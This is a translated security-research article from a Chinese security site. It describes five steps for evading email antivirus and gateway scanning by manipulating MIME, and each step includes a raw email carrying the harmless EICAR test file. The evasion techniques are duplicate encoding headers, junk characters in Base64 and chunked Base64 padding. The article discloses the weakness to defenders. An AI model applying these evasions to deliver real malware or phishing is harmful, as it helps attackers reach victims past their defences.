> 原文链接: https://www.anquanke.com//post/id/151245 


# 通过修改 MIME 绕过邮件防病毒引擎检测的五个简单步骤


                                阅读量   
                                **112078**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：noxxi.de
                                <br>原文地址：[https://noxxi.de/research/mime-5-easy-steps-to-bypass-av.html](https://noxxi.de/research/mime-5-easy-steps-to-bypass-av.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t018723b3a5e987c593.png)](https://p1.ssl.qhimg.com/t018723b3a5e987c593.png)

## 写在前面的话

传统上邮件仅限ASCII，每行限制为1000个字符。MIME[标准](http://en.wikipedia.org/wiki/MIME)定义了一种具有结构化邮件（包括附件）和传输非ASCII数据。不幸的是，标准并不复杂和灵活，有许多自相矛盾的地方，并且没有定义真正的错误处理。其中IDS / IPS，邮件网关或防病毒软件，它们通常以不同方式解释特定准备的邮件到最终用户系统。

这篇文章将展示如何通过几个简单的步骤修改带有恶意附件的邮件，并最终免杀Virustotal的防病毒软件。经过所有这些修改后，仍然可以在Thunderbird中打开邮件并运行恶意负载。在下文中，我将演示如何通过一些简单易懂的步骤隐藏恶意附件以进行正确的分析。



## 第1步：普通MIME

我们首先添加无害的EICAR测试病毒的邮件。邮件由两个MIME部分组成，第一部分是一些文本，第二部分是附件，用Base64编码， 以便将二进制附件转换为ASCII进行传输。截至今天（2018/07/05），Virustotal的36个（59个）产品能够检测到恶意负载。其余部分可能无法或未配置为处理ZIP存档中的邮件文件或恶意软件。

```
From: me@example.com
To: you@example.com
Subject: plain
Content-type: multipart/mixed; boundary=foo

--foo
Content-type: text/plain

```

病毒附加

```
--foo
Content-type: application/zip; name=whatever.zip
Content-Transfer-Encoding: base64

UEsDBBQAAgAIABFKjkk8z1FoRgAAAEQAAAAJAAAAZWljYXIuY29tizD1VwxQdXAMiDaJCYiKMDXR
CIjTNHd21jSvVXH1dHYM0g0OcfRzcQxy0XX0C/EM8wwKDdYNcQ0O0XXz9HFVVPHQ9tACAFBLAQIU
AxQAAgAIABFKjkk8z1FoRgAAAEQAAAAJAAAAAAAAAAAAAAC2gQAAAABlaWNhci5jb21QSwUGAAAA
AAEAAQA3AAAAbQAAAAAA
--foo--
```

我们可以通过保存扩展名为`.eml`的文件并使用Thunderbird打开它来验证邮件的内容。它应该显示一个名为whatever.zip的附加ZIP存档，其中包含EICAR测试病毒。



## 第2步：矛盾Content-Transfer-Encoding

首先，我们使用2015年针对AOL Mail工作的相同技巧：我们只添加一个不同的Content-Transfer-Encoding标头，从而对内容的编码方式做出矛盾的陈述。大多数邮件客户端（包括Thunderbird和Outlook）将使用第一个标头而忽略第二个标头，解释以下内容与原始邮件没有区别。尽管如此，即使问题应该至少知道了3年，Virustotal的检测率仍会从36降至28：

```
From: me@example.com
To: you@example.com
Subject: contradicting Content-Transfer-Encoding
Content-type: multipart/mixed; boundary=foo

--foo
Content-type: text/plain

```

病毒附加

```
--foo
Content-type: application/zip; name=whatever.zip
Content-Transfer-Encoding: base64
Content-Transfer-Encoding: quoted-printable

UEsDBBQAAgAIABFKjkk8z1FoRgAAAEQAAAAJAAAAZWljYXIuY29tizD1VwxQdXAMiDaJCYiKMDXR
CIjTNHd21jSvVXH1dHYM0g0OcfRzcQxy0XX0C/EM8wwKDdYNcQ0O0XXz9HFVVPHQ9tACAFBLAQIU
AxQAAgAIABFKjkk8z1FoRgAAAEQAAAAJAAAAAAAAAAAAAAC2gQAAAABlaWNhci5jb21QSwUGAAAA
AAEAAQA3AAAAbQAAAAAA
--foo--
```



## 第3步：添加垃圾字符

Base64中使用的字母表由64个明确定义的字符组成，最后可能有一些’=’。换行符用于将编码分解为单独的行，应该被忽略。但是，还不完全清楚应该如何处理任何其他（垃圾）字符的出现。标准建议但不定义忽略这些字符，即使它们不应该首先发生 – 这几乎是所有实现实际上都做的。从RFC 2045第6.8节节选：

> 编码的输出流必须以不超过76个字符的行表示。解码软件必须忽略表1中未找到的所有换行符或其他字符。在base64数据中，除表1中的字符，换行符和其他空格之外的字符可能表示传输错误，在某些情况下，警告消息甚至消息拒绝可能是适当的。

基于此，我们在Base64编码中插入了大量垃圾数据，并最终收到一封邮件，Virustotal的检测率从36降至17：

```
From: me@example.com
To: you@example.com
Subject: junk characters inside Base64 combined with contradicting CTE
Content-type: multipart/mixed; boundary=foo

--foo
Content-type: text/plain

```

病毒附加

```
--foo
Content-type: application/zip; name=whatever.zip
Content-Transfer-Encoding: base64
Content-Transfer-Encoding: quoted-printable

U.E.s.D.B.B.Q.A.A.g.A.I.A.B.F.K.j.k.k.8.z.1.F.o.R.g.A.A.A.E.Q.
A.A.A.A.J.A.A.A.A.Z.W.l.j.Y.X.I.u.Y.2.9.t.i.z.D.1.V.w.x.Q.d.X.
A.M.i.D.a.J.C.Y.i.K.M.D.X.R.C.I.j.T.N.H.d.2.1.
j.S.v.V.X.H.1.d.H.Y.M.0.g.0.O.c.f
.R.z.c.Q.x.y.0.X.X.0.C./.E.M.8.w.w.K.D.d.Y.N.c.Q.0.O.0.X.X.z.
9.H.F.V.V.P.H.Q.9.t.A.C.A.F.B.L.A.Q.I.U.
A.x.Q.A.A.g.A.I.A.B.F.K.j.k.k.8.z.1.F.o.R.g.A.A.A.E.Q
.A.A.A.A.J.A.A.A.A.A.A.A.A.A.A.A.A.A.A.C.2.g.Q.A.A.A.A.B.l.a.
W.N.h.c.i.5.j.b.2.1.Q.S.w.U.G.A.A.A.A.
A.A.E.A.A.Q.A.3.A.A.A.A.b.Q.A.A.A.A.A.A.
```

请注意，这并不意味着所有受影响的产品都无法处理Base64中的垃圾字符。更有可能的是，大多数这些产品在步骤2中都没有检测到原始的内容转移编码，但是使用了一种启发式来检测Base64编码，不管它在哪里。通过添加垃圾字符，这个启发式失败了。



## 第4步：Chunked Base64编码

在这一步中，我们回过头来，不再使用垃圾字符。相反，我们以不同的方式攻击Base64编码：正确的编码总是需要3个输入字符并将这些编码编码为4个输出字符。如果最后只剩下一个或两个输入字符，则输出仍然是4个字符，用’==’（一个输入字符）或’=’（两个输入字符）填充。

这意味着’=’或’==’应仅位于编码数据的末尾。因此，一些解码器将停在第一个’=’。例如，Thunderbird总是读取4个字节的编码数据并对其进行解码，并且不会改变中间编码数据与末尾编码数据的’=’行为。这导致了不是一次编码总共3个字符而是一次只编码2个字符的想法，在编码数据中留下了很多’=’。Thunderbird将像原始邮件一样处理此邮件，但Virustotal的检测率从36下降到1个：

```
From: me@example.com
To: you@example.com
Subject: Base64 encoded in small chunks instead one piece + contradicting CTE
Content-type: multipart/mixed; boundary=foo

--foo
Content-type: text/plain

```

病毒附加

```
--foo
Content-type: application/zip; name=whatever.zip
Content-Transfer-Encoding: base64
Content-Transfer-Encoding: quoted-printable

UEs=AwQ=FAA=AgA=CAA=EUo=jkk=PM8=UWg=RgA=AAA=RAA=AAA=CQA=AAA=ZWk=Y2E=ci4=
Y28=bYs=MPU=Vww=UHU=cAw=iDY=iQk=iIo=MDU=0Qg=iNM=NHc=dtY=NK8=VXE=9XQ=dgw=
0g0=DnE=9HM=cQw=ctE=dfQ=C/E=DPM=DAo=DdY=DXE=DQ4=0XU=8/Q=cVU=VPE=0PY=0AI=
AFA=SwE=AhQ=AxQ=AAI=AAg=ABE=So4=STw=z1E=aEY=AAA=AEQ=AAA=AAk=AAA=AAA=AAA=
AAA=AAA=ALY=gQA=AAA=AGU=aWM=YXI=LmM=b20=UEs=BQY=AAA=AAA=AQA=AQA=NwA=AAA=
bQA=AAA=AAA=
--foo--
```



## 第5步：再次使用垃圾字符

为了混淆最后剩下的产品，我们再次添加第3步中的垃圾字符。这成功地将检测率从36降低到零：

```
From: me@example.com
To: you@example.com
Subject: chunked Base64 combined with junk characters and contradicting CTE
Content-type: multipart/mixed; boundary=foo

--foo
Content-type: text/plain

```

病毒附加

```
--foo
Content-type: application/zip; name=whatever.zip
Content-Transfer-Encoding: base64
Content-Transfer-Encoding: quoted-printable

UEs=.AwQ=.FAA=.AgA=.CAA=.EUo=.jkk=.PM8=.UWg=.RgA=.AAA=.RAA=.AAA=.CQA=.AAA=.
ZWk=.Y2E=.ci4=.Y28=.bYs=.MPU=.Vww=.UHU=.cAw=.iDY=.iQk=.iIo=.MDU=.0Qg=.iNM=.
NHc=.dtY=.NK8=.VXE=.9XQ=.dgw=.0g0=.DnE=.9HM=.cQw=.ctE=.dfQ=.C/E=.DPM=.DAo=.
DdY=.DXE=.DQ4=.0XU=.8/Q=.cVU=.VPE=.0PY=.0AI=.AFA=.SwE=.AhQ=.AxQ=.AAI=.AAg=.
ABE=.So4=.STw=.z1E=.aEY=.AAA=.AEQ=.AAA=.AAk=A.AA=.AAA=.AAA=.AAA=.AAA=.ALY=.
gQA=.AAA=.AGU=.aWM=.YXI=.LmM=.b20=.UEs=.BQY=.AAA=.AAA=.AQA=.AQA=.NwA=.AAA=.
bQA=.AAA=.AAA=.
--foo--
```



## 结论

请注意，这篇文章只是对可以做什么的一个小小的洞察。我发现了更多的bypass，包括内容分析和从附件中提取正确的文件名（以阻止`.exe`，`.scr`等）。MIME的情况与我在HTTP中描述的情况差不多并。这些方法不仅限于欺骗恶意软件分析。通过将这些方法应用于向用户显示的文本内容，它们还可用于欺骗网络钓鱼和垃圾邮件检测。例如，它们可用于使分析看到乱码或使其分析错误的MIME部分，但将邮件显示为最终用户的预期。

审核人：yiwang   编辑：边边
